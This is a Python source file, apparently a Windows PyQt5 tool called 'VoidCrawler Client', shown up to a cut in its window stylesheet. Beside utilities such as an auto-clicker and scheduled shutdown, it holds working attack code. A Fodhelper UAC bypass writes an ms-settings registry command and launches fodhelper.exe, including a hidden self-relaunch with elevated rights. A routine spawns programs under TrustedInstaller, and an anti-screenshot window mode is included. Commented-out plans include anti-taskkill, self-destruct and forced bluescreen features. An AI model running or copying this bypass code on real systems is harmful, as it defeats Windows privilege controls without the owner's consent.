
# ---------- 依赖库 ----------
import os
import sys
import subprocess
import argparse
import json
import winreg
import pyautogui
from pydantic import BaseModel, ValidationError, Field
from typing import *

import threading
import multiprocessing

import time
import datetime

import logging
import logging.config

import win32api
import win32con
import win32event
import win32process

import ctypes
from ctypes import wintypes

from pynput import keyboard
from pynput.keyboard import Key, KeyCode

from tkinter import *
from tkinter import ttk
from tkinter.messagebox import *

from PyQt5.QtWidgets import *
from PyQt5.QtCore import *
from PyQt5.QtGui import *


# ---------- 项目中其他依赖 ----------
import ConfigWindow
import TimeOperation as timeop
import FunctionLibrary as funlib
import GetComputerInfo
import Prompt

config_windows : list = []


# ---------- PyAutoGUI 配置 ----------
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0


# ---------- 配置文件检查 ----------

class LoggingSubModel(BaseModel):
    json_data: dict = Field(alias='json')

class JsonSubModel(BaseModel):
    json_ensure_ascii: bool
    json_indent: int
    config_filename: str

class FodhelperUACBypassSubModel(BaseModel):
    program: str

# class SelfFodhelperUACBypassSubModel(BaseModel):
#     pass
#     self_program: str

class TrustedInstallerRunSubModel(BaseModel):
    program: str

class AutoClickSubModel(BaseModel):
    key: str
    cps: int
    auto_stop_second: int | None
    hotkeys: List[str]

class AutoShutdownSubModel(BaseModel):
    time: List[int]
    force: bool

class ConfigModel(BaseModel):
    """
    配置模型，用于类型检查。

    示例：
    ```python
    a: int
    d: SubModel
    g: List[Union[bool, str]]  # 列表包含布尔和字符串
    ```
    """
    no_admin: bool
    admin_warning: bool
    file_encoding: str
    version: str
    json_data: JsonSubModel = Field(alias='json')
    logging: LoggingSubModel
    FodhelperUACBypass: FodhelperUACBypassSubModel
    SelfFodhelperUACBypass: Any
    # 非常离奇的Bug，下面这行代码在提权重启后有Bug，放着不管了qwq
    # SelfFodhelperUACBypass: SelfFodhelperUACBypassSubModel
    TrustedInstallerRun: TrustedInstallerRunSubModel
    auto_click: AutoClickSubModel
    auto_shutdown: AutoShutdownSubModel

    class Config:
        extra = "ignore"  # 忽略多余字段



def get_current_file_path():
    """获取当前文件的完整路径，适配Pyinstaller"""
    if getattr(sys, 'frozen', False):
        # 打包后的环境
        if hasattr(sys, '_MEIPASS'):
            # 单文件模式：返回可执行文件的完整路径
            return os.path.abspath(sys.executable)
        else:
            # 文件夹模式
            return os.path.abspath(sys.executable)
    else:
        # 开发环境：返回当前Python文件的完整路径
        return os.path.abspath(__file__)
    

default_config = {
    "no_admin": True,         # 允许无管理员权限运行
    "admin_warning": True,    # 提示无管理员权限警告
    "file_encoding": "utf-8", # 【不应该更改】文件读写默认编码
    "version": "v.0.0.1",     # 【不应该更改】客户端版本号

    "restart_self_program": f"powershell.exe -WindowStyle Hidden -Command \"{get_current_file_path() if get_current_file_path().endswith('.exe') else 'python.exe ' + get_current_file_path()}\"", 
    # 【不应该更改】

    "Shortcutkey" :{
        "display_window": [
            "f4"
        ]
    }, 
    "json": {
        "json_ensure_ascii": False, # JSON 文件写入时是否使用 ASCII 编码
        "json_indent": 4,           # JSON 文件写入时的缩进级别
        "config_filename": "VoidCrawlerConfig.json" # 【不可更改】配置文件名称
    }, 
    "logging": {
        "json": {
            "version": 1,
            "formatters": {
                "default": {
                    "format": "%(asctime)s.%(msecs)03d - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(funcName)s - %(message)s"
                }
            },
            "handlers": {
                "file": {
                    "class": "logging.handlers.TimedRotatingFileHandler",
                    "filename": "VoidCrawlerClient.log",
                    "when": "midnight",  # 每天午夜轮转
                    "interval": 1,
                    "backupCount": 10,
                    "encoding": "utf-8",
                    "formatter": "default"
                }
            },
            "root": {
                "level": logging.DEBUG,
                "handlers": ["file"]
            }
        }
    },
    "FodhelperUACBypass": {
        "program": "cmd.exe",
    },
    "SelfFodhelperUACBypass": {
        "self_program": f"powershell.exe -WindowStyle Hidden -Command \"{get_current_file_path() + ' -privilege_escalation' if get_current_file_path().endswith('.exe') else 'python.exe ' + get_current_file_path() + ' -privilege_escalation'}\""
        # 【不应该更改】
    },
    "TrustedInstallerRun": {
        "program": "cmd.exe"
    },
    "auto_click": {
        "key": "mouse_left", # 左/中/右/键盘按键
        "cps": 5, # CPS 每秒点击次数
        "auto_stop_second": 0, # 自动停止（几秒后停止，0表示不自动停止)
        "hotkeys": [
            "f8"
        ]
    },
    "auto_shutdown": {
        "time": [1, 1, 0, 0, 0], # 格式：[month, day, hour, minute, second]
        #           0  0 -1 -1 -1
        # 0或-1用来表示任意
        "force": False
    }, 
    "clear_log": {
        "permanent": False
    }, 
    "toggle_window_invisibility": {
        "dwAffinity": False
    }
}


def read_json(file: str, encoding : str= default_config['file_encoding'], *args) -> Any:
    """ 读取 JSON 文件 """
    with open(file, 'r', encoding=encoding, *args) as f:
        return json.load(f)


try:                            # 请勿删除或移动！！！！！，存在强的逻辑关系
    config = read_json(default_config['json']['config_filename'])
except Exception as e:
    config = default_config



    

def disable_redirection():
    """禁用WOW64文件系统重定向"""
    old_value = wintypes.DWORD()
    success = ctypes.WinDLL('kernel32', use_last_error=True).Wow64DisableWow64FsRedirection(ctypes.byref(old_value))
    if not success:
        logging.error("禁用重定向失败")
        return None
    logging.debug("禁用WOW64文件系统重定向")
    return old_value

def revert_redirection(old_value):
    """恢复WOW64文件系统重定向"""
    if old_value is not None:
        success = ctypes.WinDLL('kernel32', use_last_error=True).Wow64RevertWow64FsRedirection(old_value)
        if not success:
            logging.error("恢复重定向失败")
    logging.debug("恢复WOW64文件系统重定向")


def FodhelperUACBypassOp(program : str = "cmd.exe"):
    """
    Fodhelper UAC Bypass

    UAC 绕过拿到管理员权限（线程运行，这样就不需要恢复重定向了，系统文件重定向仅影响当前线程）
    """

    # 定义注册表路径
    key_path = r"Software\Classes\ms-settings\shell\open\command"
    old_redir = disable_redirection()
    try:
        # 打开或创建注册表项
        # 使用HKEY_CURRENT_USER根键
        # winreg.KEY_WRITE表示写入权限
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        
        # 创建DelegateExecute字符串值，值为空
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 设置(默认)值的内容为cmd.exe
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
        
    except Exception as e:
        showerror("VoidCrawler", f"修改注册表时出错: {e}")
        # 关闭注册表键
        if 'key' in locals():
            winreg.CloseKey(key)
        raise e
    else:
        # 关闭注册表键
        if 'key' in locals():
            winreg.CloseKey(key)
        os.system("C:\\Windows\\System32\\fodhelper.exe")


def FodhelperUACBypass(button: Any) -> None:
    """
    Fodhelper UAC Bypass

    UAC 绕过拿到管理员权限的功能
    """
    program = config["FodhelperUACBypass"]["program"]
    p = multiprocessing.Process(
        target=FodhelperUACBypassOp, 
        args=(program,)
    )
    p.start()


def SetFodhelperUACBypass() -> None:
    config_windows.append(ConfigWindow.show_config_window(
                "Fodhelper UAC Bypass", 
                list(map(list, config['FodhelperUACBypass'].items()))
            )
    )
    index = len(config_windows) - 1
    config["FodhelperUACBypass"] = config_windows[index].wait_for_result()
    config_windows.pop(index)
    write_json(config['json']['config_filename'], config)


def SelfFodhelperUACBypass(button: Any) -> None:
    """
    对自身提权
    Fodhelper UAC Bypass
    UAC 绕过拿到管理员权限的功能
    """
    program = config['SelfFodhelperUACBypass']['self_program']
    p = multiprocessing.Process(
        target=FodhelperUACBypassOp, 
        args=(program,)
    )
    p.start()
    sys.exit(0)


def SetSelfFodhelperUACBypass() -> None:
    l = list(map(list, config['SelfFodhelperUACBypass'].items()))
    l.insert(0, ["Should not be changed / 不应更改", "separator"])
    config_windows.append(ConfigWindow.show_config_window(
                "Self Fodhelper UAC Bypass", 
                l
                # list(map(list, config['SelfFodhelperUACBypass'].items())).insert(0, ["Should not be changed 不应更改", "separator"])
            )
    )
    index = len(config_windows) - 1
    config["SelfFodhelperUACBypass"] = config_windows[index].wait_for_result()
    config_windows.pop(index)
    write_json(config['json']['config_filename'], config)


def validate_json_file(file_path) -> Any:
    """
    验证 JSON 文件
    - 成功返回 JSON 文件数据
    - 失败抛出对应异常
    """
    try:
        encoding = default_config['file_encoding']
        if type(config) == dict:
            if 'file_encoding' in config:
                encoding = config['file_encoding']
        data = read_json(file_path, encoding)
        del encoding

        # 验证数据
        validated_data = ConfigModel(**data)
        return data
        
    except ValidationError as e:
        raise ValidationError(f"配置文件验证失败: {e}")
    except FileNotFoundError as e:
        raise FileNotFoundError(f"配置文件不存在：{e}")
    except Exception as e:
        raise Exception(f"读取配置文件时出错: {e}")


def write_json(file: str, data: Any, encoding : str= config['file_encoding'], *args) -> None:
    """ 写入 JSON 文件 """
    with open(file, 'w', encoding=encoding, *args) as f:
        json.dump(data, f, ensure_ascii=config['json']['json_ensure_ascii'], indent=config['json']['json_indent'])


try:
    config = validate_json_file(default_config['json']['config_filename'])
except FileNotFoundError:
    # 配置文件不存在，自动创建
    config = default_config
    write_json(config["json"]["config_filename"], config)
except Exception as e:
    v = askyesnocancel('VoidCrawler', f'配置文件错误，点击“是”重置配置文件，点击“否”直接退出程序，点击“取消”忽略。\n错误详情：{e}')
    if v:
        config = default_config
        write_json(config["json"]["config_filename"], config)
    elif not v is None:
        sys.exit(1)






# logging.basicConfig(
#     level=config['logging']['level'], 
#     format=config['logging']['format'], 
#     filename=config['logging']['filename'], 
#     encoding=config['file_encoding']
# )
# file_handler = logging.handlers.RotatingFileHandler(
#     'app.log',
#     maxBytes=10*1024*1024,  # 10MB
#     backupCount=5,
#     delay=True  # 延迟打开文件，直到第一次写入
# )
logging.config.dictConfig(config['logging']['json'])
logging.debug('Run VoidCrawler Client!')



class ButtonType:
    # 按钮类型常量
    TYPE_BUTTON = 0
    TYPE_SWITCH_ON = 1
    TYPE_SWITCH_OFF = 2


def TrustedInstallerRun(button: Any):
    """ 以 TrustedInstaller 权限运行程序 """
    if not is_admin():
        showwarning('VoidCrawler', '检测到当前权限小于管理员权限，此功能无法使用！')
        return
    try:
        subprocess.run(["powershell.exe", "-Command", f"Set-ExecutionPolicy Unrestricted -Force; Import-Module NtObjectManager; sc.exe start TrustedInstaller; Set-NtTokenPrivilege SeDebugPrivilege; $p = Get-NtProcess -Name TrustedInstaller.exe; $process = New-Win32Process {config['TrustedInstallerRun']['program']} -CreationFlags NewConsole -ParentProcess $p"], 
                       capture_output=True, 
                       text=True, 
                       check=False)
    except Exception as e:
        showerror('VoidCrawler', f'无法以 TrustedInstaller 权限运行程序: {e}')


def SetTrustedInstallerRun() -> None:
    config_windows.append(ConfigWindow.show_config_window(
                "TrustedInstaller Run", 
                list(map(list, config['TrustedInstallerRun'].items()))
            )
    )
    index = len(config_windows) - 1
    config["TrustedInstallerRun"] = config_windows[index].wait_for_result()
    config_windows.pop(index)
    write_json(config['json']['config_filename'], config)


def open_timeop(button: Any):
    timeop.main()


# 创建全局信号发射器
class SignalEmitter(QObject):
    prompt_signal = pyqtSignal(object, object)  # 定义信号
    # 参数可以是 int, str, float, object 等等
    # 如果需要传入更多参数，多加几个参数，比如：(object, object, object, object)

# 全局信号发射器
_emitter = SignalEmitter()


def auto_click(button: Any) -> None:
    """
    Auto Click 自动点击
    """
    global _click_thread, _check_thread, _stop_event, _emitter
    
    # 连接信号到提示函数（只需要连接一次）
    if not hasattr(_emitter, '_connected'):
        _emitter.prompt_signal.connect(Prompt.new_prompt)
        _emitter._connected = True
    
    button_type = button.config['type']
    # 初始化全局变量（如果是第一次调用）
    if '_stop_event' not in globals():
        _stop_event = threading.Event()
        _click_thread = None
        _check_thread = None
    
    if config['auto_click']['key'] == 'mouse_left':
        clk = lambda: pyautogui.click(button='left')
    elif config['auto_click']['key'] == 'mouse_middle':
        clk = lambda: pyautogui.click(button='middle')
    elif config['auto_click']['key'] == 'mouse_right':
        clk = lambda: pyautogui.click(button='right')
    else:
        clk = lambda: pyautogui.press(config['auto_click']['key'])

    # 共享标志变量 - 用于控制点击的启停
    click_flag = False  # 是否正在点击
    flag_lock = threading.Lock()
    
    def stop_or_start(*args, **kwargs) -> None:
        """ 开始或结束点击线程 - 热键回调函数"""
        nonlocal click_flag
        with flag_lock:
            click_flag = not click_flag  # 切换点击状态
        status = "start" if click_flag else "stoped"
        logging.info(f"Auto click {status} by hotkey.")
        
        # 发射信号，在主线程中显示提示
        _emitter.prompt_signal.emit("Auto Click Module", f"Auto Click is {status}.")
    
    def stop_click_thread() -> None:
        """完全停止所有线程"""
        global _click_thread, _check_thread, _stop_event, hotkey
        
        _stop_event.set()
        
        # 停止热键监听
        hotkey.stop()
        
        # 等待线程结束
        if _click_thread and _click_thread.is_alive():
            _click_thread.join(timeout=1)
        
        if _check_thread and _check_thread.is_alive():
            _check_thread.join(timeout=1)
        
        _click_thread = None
        _check_thread = None
        _stop_event.clear()
        
        logging.info("Auto click threads stopped completely")

    def check_thread_function() -> None:
        """热键监听线程"""
        global hotkey
        hotkey = funlib.GlobalHotkey(config['auto_click']['hotkeys'], stop_or_start)
        try:
            hotkey.start()
        except KeyboardInterrupt:
            logging.info("The auto click was interrupted by the user.")
        except Exception as e:
            logging.error(f"Hotkey listener error: {e}")
        finally:
            hotkey.stop()

    def click_thread_function() -> None:
        """点击执行线程"""
        nonlocal click_flag
        
        try:
            interval = 1 / config['auto_click']['cps']
        except ZeroDivisionError:
            logging.error(f"ZeroDivisionError: AutoClickThread: config['auto_click']['cps'] Error: {config['auto_click']['cps']}")
            return
        
        logging.info("Click thread started")
        
        while not _stop_event.is_set():
            # 检查点击标志
            with flag_lock:
                should_click = click_flag
            
            if not should_click:
                # 点击被暂停，短暂睡眠后继续检查
                time.sleep(0.1)
                start_time = time.time()
                continue
            
            # 检查自动停止时间
            auto_stop_enabled = config['auto_click']['auto_stop_second'] != 0
            if auto_stop_enabled:
                time_elapsed = time.time() - start_time
                if time_elapsed > config['auto_click']['auto_stop_second']:
                    logging.info("Auto stop time reached")
                    with flag_lock:
                        click_flag = False  # 自动停止点击
                    continue
            
            # 执行点击
            try:
                clk()
            except Exception as e:
                logging.error(f"Click error: {e}")
            
            # 控制点击频率
            time.sleep(interval)
        
        logging.info("Click thread stopped")
        

    if button_type == ButtonType.TYPE_SWITCH_ON:
        # 启动模式
        _stop_event.clear()  # 重置停止事件
        
        # 显示开始提示
        _emitter.prompt_signal.emit("Auto Click Module", "Auto Click is on.")
        
        # 启动检查线程（热键监听）
        _check_thread = threading.Thread(
            target=check_thread_function, 
            daemon=True, 
            name="autoclick_check_thread"
        )
        _check_thread.start()
        
        # 启动点击线程
        _click_thread = threading.Thread(
            target=click_thread_function, 
            daemon=True, 
            name="autoclick_click_thread"
        )
        _click_thread.start()
        
        logging.info("Auto click started")
        
    elif button_type == ButtonType.TYPE_SWITCH_OFF:
        # 停止模式
        stop_click_thread()
        # 显示停止提示
        _emitter.prompt_signal.emit("Auto Click Module", "Auto Click is off.")
        logging.info("Auto click stopped by switch")
    else:
        logging.error(f"In auto_click function, ButtonType is not switch. Got: {button_type}")
        raise ValueError(f"In auto_click function, ButtonType is not switch. Got: {button_type}")



def set_auto_click() -> None:
    """
    配置 : Auto Click 自动点击
    """
    NAME = ["Key: Keyboard keys or mouse_left/right/middle", "Key", "CPS", "Auto Stop \nSecond \n(0 means not \nautomatically \nstopping)", "Hotkeys"]
    config_windows.append(ConfigWindow.show_config_window(
            "Auto Click or Press Keys", 
            [
                [NAME[0], "separator"], 
                [NAME[1], config["auto_click"]["key"]], 
                [NAME[2], config["auto_click"]["cps"], 1, 100], 
                [NAME[3], config["auto_click"]["auto_stop_second"], 0, 3600], 
                [NAME[4], "list", config["auto_click"]["hotkeys"], str]
            ]
        )
    )
    index = len(config_windows) - 1
    r = config_windows[index].wait_for_result()
    config_windows.pop(index)
    config["auto_click"]["key"] = r[NAME[1]]
    config["auto_click"]["cps"] = r[NAME[2]]
    config["auto_click"]["auto_stop_second"] = r[NAME[3]]
    config["auto_click"]["hotkeys"] = r[NAME[4]]
    write_json(config['json']['config_filename'], config)


def shutdown_gui(button: Any) -> None:
    def thread_function() -> None:
        os.system("shutdown -i")
    t = threading.Thread(target=thread_function)
    t.start()


def auto_shutdown(button: Any) -> None:
    """
    Auto Shutdown 自动关机
    """
    button_type = button.config['type']
    if button_type == ButtonType.TYPE_SWITCH_ON:
        MAX_SECOND = 315360000
        n = datetime.datetime.now()
        c = config['auto_shutdown']['time']
        t = 0
        if askyesno("VoidCrawler", f"请确保你的日期正确，否则会在错误的时间关机！点击“是”继续。\n你的时间：{c[0]}-{c[1]} {c[2]}:{c[3]}:{c[4]}\n现在时间：{n.strftime("%Y-%m-%d %H:%M:%S")}"):
            if c[0] != 0:
                t += (c[0] - n.month) * 2628000
            if c[1] != 0:
                t += (c[1] - n.day) * 86400
            if c[2] != -1:
                t += (c[2] - n.hour) * 3600
            if c[3] != -1:
                t += (c[3] - n.minute) * 60
            if c[4] != -1:
                t += c[4] - n.second
            if t < 0:
                showerror("VoidCrawler", "日期比现在早！")
                stylish_window.on_button_click(button)
                logging.info("Auto Shutdown: config date < 0!")
                return
            if t > MAX_SECOND:
                showerror("VoidCrawler", "日期距离现在最多有 10 年！")
                stylish_window.on_button_click(button)
                logging.info("Auto Shutdown: config date > 10 year!")
                return
            t = str(t)
            logging.info(f"Shutdown Command: \"shutdown /s /f /t {t}\"")
            if config['auto_shutdown']['force']:
                os.system(f"shutdown /s /f /t {t}")
            else:
                os.system(f"shutdown /s /t {t}")
    elif button_type == ButtonType.TYPE_SWITCH_OFF:
        logging.info("Cancel shutdown.")
        os.system("shutdown -a")
    else:
        logging.error(f"Auto Shutdown: button value error: {button}")
        raise ValueError(f"Auto Shutdown: button value error: {button}")


def set_auto_shutdown() -> None:
    """
    配置 : Auto Shutdown 自动关机
    """
    NAME = ["Month(or 0)", "Day(or 0)", "Hour(or -1)", "Minute(or -1)", "Second(or -1)", "Force(or -1)"]
    config_windows.append(ConfigWindow.show_config_window(
                "Auto Shutdown", 
                [
                    [NAME[0], config["auto_shutdown"]["time"][0], 0, 12], 
                    [NAME[1], config["auto_shutdown"]["time"][1], 0, 31], 
                    [NAME[2], config["auto_shutdown"]["time"][2], -1, 24], 
                    [NAME[3], config["auto_shutdown"]["time"][3], -1, 60], 
                    [NAME[4], config["auto_shutdown"]["time"][4], -1, 60], 
                    [NAME[5], config["auto_shutdown"]["force"]], 
                ]
            )
    )
    index = len(config_windows) - 1
    r = config_windows[index].wait_for_result()
    config_windows.pop(index)
    config["auto_shutdown"]["time"][0] = r[NAME[0]]
    config["auto_shutdown"]["time"][1] = r[NAME[1]]
    config["auto_shutdown"]["time"][2] = r[NAME[2]]
    config["auto_shutdown"]["time"][3] = r[NAME[3]]
    config["auto_shutdown"]["time"][4] = r[NAME[4]]
    config["auto_shutdown"]["force"] = r[NAME[5]]
    write_json(config['json']['config_filename'], config)


def computer_info(*args, **kwargs) -> None:
    """
    查看计算机信息
    """
    GetComputerInfo.ComputerInfoWindow().show()


def clear_log(*args, **kwargs) -> None:
    """
    清空日志
    """
    funlib.clear_log(config)


def set_clear_log(*args, **kwargs) -> None:
    """
    配置： 清空日志
    """
    NAME = ["Permanent"]
    config_windows.append(ConfigWindow.show_config_window(
                "Clear Log", 
                [
                    [NAME[0], config["clear_log"]["permanent"]]
                ]
            )
    )
    index = len(config_windows) - 1
    r = config_windows[index].wait_for_result()
    config_windows.pop(index)
    config["clear_log"]["permanent"] = r[NAME[0]]
    write_json(config['json']['config_filename'], config)


def reset_config(*args, **kwargs) -> NoReturn:
    """
    重置配置文件，在这之后关闭客户端。
    """
    if askyesno("VoidCrawler", "Are you sure you want to reset the configuration file?\nAfterwards, the client will close."):
        # 直接写入默认配置（不用对config赋值）
        write_json(config['json']['config_filename'], default_config)
        # os.system(config['restart_self_program'])
        sys.exit(0)


def client_configuration(*args, **kwargs) -> NoReturn:
    """
    配置： 客户端配置
    """

    NAME = ["Attention: After modification, \nthe client will close, please restart the client.", "Display\nWindow"]
    config_windows.append(ConfigWindow.show_config_window(
                "Clear Log", 
                [
                    [NAME[0], "separator"], 
                    [NAME[1], "list", config["Shortcutkey"]["display_window"], str]
                ]
            )
    )
    index = len(config_windows) - 1
    r = config_windows[index].wait_for_result()
    config_windows.pop(index)
    config["Shortcutkey"]["display_window"] = r[NAME[1]]


    write_json(config['json']['config_filename'], config)
    sys.exit(0)


def ToggleWindowInvisibility(button: Any, window: QMainWindow) -> None:
    """
    ToggleWindowInvisibility

    Args:
        window: 要修改的窗口
    """
    # Windows API 常量
    WDA_NONE = 0x0
    window_id = int(window.winId())
    button_type = button.config['type']
    if button_type == ButtonType.TYPE_SWITCH_ON:
        funlib.toggle_window_invisibility(window_id, 0x01 if config['toggle_window_invisibility']['dwAffinity'] else 0x11)
    elif button_type == ButtonType.TYPE_SWITCH_OFF:
        funlib.toggle_window_invisibility(window_id, WDA_NONE)
    else:
        logging.error(f"In ToggleWindowInvisibility function, ButtonType is not switch. Got: {button_type}")
        raise ValueError(f"In ToggleWindowInvisibility function, ButtonType is not switch. Got: {button_type}")


def ConfigToggleWindowInvisibility(*args, **kwargs) -> NoReturn:
    """
    配置： ToggleWindowInvisibility
    """

    NAME = ["On (WDA_MONITOR): Black Window", 
            "Off (WDA_EXCLUDEFROMCAPTURE):  Hide\nIntroduced in Windows 10 Version 2004.", 
            "Disable Model(WDA_NONE): Normal", 
            "Mode"
            ]
    config_windows.append(ConfigWindow.show_config_window(
                "ToggleWindowInvisibility", 
                [
                    [NAME[0], "separator"], 
                    [NAME[1], "separator"], 
                    [NAME[2], "separator"], 
                    [NAME[3], config["toggle_window_invisibility"]["dwAffinity"]]
                ]
            )
    )
    index = len(config_windows) - 1
    r = config_windows[index].wait_for_result()
    config_windows.pop(index)
    config["toggle_window_invisibility"]["dwAffinity"] = r[NAME[3]]
    write_json(config['json']['config_filename'], config)


def display_help(button: Any) -> None:
    """ 显示帮助信息 """
    s = f"""VoidCrawler Client / 虚空潜行者 客户端
Version / 版本 : {config['version']}
仅用于授权测试或教育目的，请勿用于非法目的！
"""
    showinfo(f'VoidCrawler Client - {config['version']} - Help', s)


class StylishWindow(QMainWindow):
    
    def __init__(self):
        super().__init__()
        self.buttons_cfg = [
            {'id': 'TrustedInstallerRun', 'text': 'TrustedInstallerRun', 'color': "#777777", 'type': ButtonType.TYPE_BUTTON, 
             'command': TrustedInstallerRun, 'set_command': SetTrustedInstallerRun, 'description': '以 TrustedInstaller 权限（最高权限）运行程序', 'is_admin': True},
            {'id': 'TimeOperation', 'text': 'TimeOperation', 'color': "#777777", 'type': ButtonType.TYPE_BUTTON, 
             'command': open_timeop, 'set_command': None, 'description': '打开时间操作（TimeOperation）工具', 'is_admin': True},
            {'id': 'FodhelperUACBypass', 'text': 'FodhelperUACBypass', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': FodhelperUACBypass, 'set_command': SetFodhelperUACBypass, 'description': '以Fodhelper UAC Bypass的方式绕过UAC得到管理员权限', 'is_admin': False},
            {'id': 'SelfFodhelperUACBypass', 'text': 'SelfFodhelperUACBypass', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': SelfFodhelperUACBypass, 'set_command': SetSelfFodhelperUACBypass, 'description': '以Fodhelper UAC Bypass的方式绕过UAC得到管理员权限并重启客户端', 'is_admin': False},
            {'id': 'AutoClick', 'text': 'AutoClick', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_OFF, 
             'command': auto_click, 'set_command': set_auto_click, 'description': 'AC 自动模拟点击', 'is_admin': False},
            {'id': 'ClientHelp', 'text': 'ClientHelp', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': display_help, 'set_command': None, 'description': '获取帮助信息', 'is_admin': False},
            {'id': 'ShutdownGUI', 'text': 'ShutdownGUI', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': shutdown_gui, 'set_command': None, 'description': '打开远程关机对话框', 'is_admin': False},
            {'id': 'AutoShutdown', 'text': 'AutoShutdown', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_OFF, 
             'command': auto_shutdown, 'set_command': set_auto_shutdown, 'description': '自动定时关机', 'is_admin': False},
            {'id': 'ComputerInfo', 'text': 'ComputerInfo', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': computer_info, 'set_command': None, 'description': '查看计算机详细信息', 'is_admin': False},
            {'id': 'ClearLog', 'text': 'ClearLog', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': clear_log, 'set_command': None, 'description': '清空日志文件', 'is_admin': False},
            {'id': 'ClientConfiguration', 'text': 'ClientConfiguration', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': client_configuration, 'set_command': client_configuration, 'description': '客户端配置', 'is_admin': False}, 
            {'id': 'ResetConfig', 'text': 'ResetConfig', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
             'command': reset_config, 'set_command': None, 'description': '重置配置文件并关闭客户端（谨慎使用）', 'is_admin': False}, 
            {'id': 'ToggleWindowInvisibility', 'text': 'ToggleWindowInvisibility', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_OFF, 
             'command': ToggleWindowInvisibility, 'set_command': ConfigToggleWindowInvisibility, 'description': '设置客户端窗口显示，实现反截屏', 'is_admin': False},

            # {'id': 'SetAnyWindowDisplayAffinity', 'text': 'SetAnyWindowDisplayAffinity', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_OFF, 
            #  'command': None, 'set_command': None, 'description': '设置任何窗口显示，实现反截屏', 'is_admin': False},
            # {'id': 'Killer', 'text': 'Killer', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
            #  'command': None, 'set_command': None, 'description': '进程 Kill', 'is_admin': False},
            # {'id': 'NoTaskkill', 'text': 'NoTaskkill', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_OFF, 
            #  'command': None, 'set_command': None, 'description': '客户端防 Taskkill', 'is_admin': False},
            # {'id': 'WindowsUpdates', 'text': 'WindowsUpdates', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_ON, 
            #  'command': None, 'set_command': None, 'description': '启用/禁用Windows 更新', 'is_admin': False},
            # {'id': 'PATHSettings', 'text': 'PATHSettings', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
            #  'command': None, 'set_command': None, 'description': '更好的环境变量PATH设置', 'is_admin': False},
            # {'id': 'ForcefullyDeleteFiles', 'text': 'ForcefullyDeleteFiles', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
            #  'command': None, 'set_command': None, 'description': '通过特殊手段强制删除文件', 'is_admin': False},
            # {'id': 'SelfDestructClient', 'text': 'SelfDestructClient', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
            #  'command': None, 'set_command': None, 'description': '一键自毁客户端（谨慎使用）', 'is_admin': False},
            # {'id': 'FastBlueScreen', 'text': 'FastBlueScreen', 'color': '#777777', 'type': ButtonType.TYPE_BUTTON, 
            #  'command': None, 'set_command': None, 'description': '快速蓝屏，支持多种蓝屏方式（谨慎使用）', 'is_admin': False},
            # {'id': 'AutoUpdate', 'text': 'AutoUpdate', 'color': '#777777', 'type': ButtonType.TYPE_SWITCH_ON, 
            #  'command': None, 'set_command': None, 'description': '自动更新软件', 'is_admin': False},
        ]
        self.dragging = False
        self.drag_position = QPoint()
        self.initUI()


    def close_button_clicked(self, event):
        if event.button() == Qt.LeftButton:
            self.close()


    def initUI(self):
        # 设置窗口属性
        self.setWindowTitle(f'VoidCrawler Client - {config['version']}')
        
        # 设置无边框但可移动的窗口，并置顶
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        
        # 设置窗口背景色和工具提示样式
        self.setStyleSheet("""
            QMainWindow {
                background: qlineargradient(x1: 0, y1: 0, x2: 0, y2: 1,
                                          stop: 0 #2c3e50, stop: 1 #34495e);
                border: 2px solid #1abc9c;
            }
            QToolTip {
                background-color: #2c3e50;
                color: #ecf0f1;
                border: 1px solid #1abc9c;
                padding: 5px;
                border-radius: 3px;
                font-size: 12px;
            }
        """)
        
        # 创建中央部件
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # 创建主布局
        layout = QVBoxLayout(central_widget)
        layout.setContentsMargins(0, 0, 0, 0)  # 移除所有边距
        layout.setSpacing(0)  # 移除按钮间缝隙
        
        # 创建标题栏
        title_widget = QWidget()
        title_widget.setFixedHeight(40)
        title_widget.setStyleSheet("""
            QWidget {
                background: rgba(52, 73, 94, 0.8);
                border-bottom: 2px solid #1abc9c;
            }
        """)
        
        # 标题栏水平布局
        title_layout = QHBoxLayout(title_widget)
        title_layout.setContentsMargins(0, 0, 0, 0)
        title_layout.setSpacing(0)

        admin = is_admin()

        if admin:
            # 创建用于显示图标的 QLabel
            icon_label = QLabel()
            icon_label.setAlignment(Qt.AlignCenter)
            pixmap = QPixmap("./assets/admin.png")
            icon_label.setPixmap(pixmap)  # 在 QLabel 上设置图片 [citation:1][citation:6]
            # pixmap = pixmap.scaled(32, 32, Qt.KeepAspectRatio)
            icon_label.setFixedSize(24, 24)
            icon_label.setScaledContents(True)  # 图片自适应QLabel大小


        # 标题标签（占据大部分空间）
        title_label = QLabel(f'VoidCrawler Client - {config['version']}')
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("""
            QLabel {
                color: #ecf0f1;
                font-size: 20px;
                font-weight: bold;
                background: transparent;
                padding: 0px;
                margin: 0px;
            }
        """)

        # 关闭按钮（右侧）
        close_button = QLabel('✘')
        close_button.setAlignment(Qt.AlignCenter)
        close_button.setFixedSize(40, 40)
        close_button.setStyleSheet("""
            QLabel {
                color: #ecf0f1;
                font-size: 18px;
                font-weight: bold;
                background: transparent;
                border: none;
                padding: 0px;
                margin: 0px;
            }
